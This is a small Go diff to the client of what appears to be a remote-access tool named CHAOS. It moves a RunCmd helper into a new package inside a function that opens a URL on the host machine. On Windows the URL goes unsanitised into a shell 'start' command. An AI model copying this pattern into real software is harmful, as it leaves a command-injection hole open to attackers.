@@ -7,6 +7,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
 	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
+	"github.com/tiagorlampert/CHAOS/client/app/util/os"
 	"net"
 	"os/exec"
 )
@@ -25,7 +26,7 @@ func (o OpenURLUseCase) Open(url string) {
 	var err error
 	switch util.DetectOS() {
 	case util.Windows:
-		_, err = util.RunCmd(fmt.Sprintf("start %s", url), 10)
+		_, err = os.RunCmd(fmt.Sprintf("start %s", url), 10)
 	case util.Linux:
 		err = exec.Command(fmt.Sprintf("xdg-open %s", url)).Start()
 	case util.Darwin:
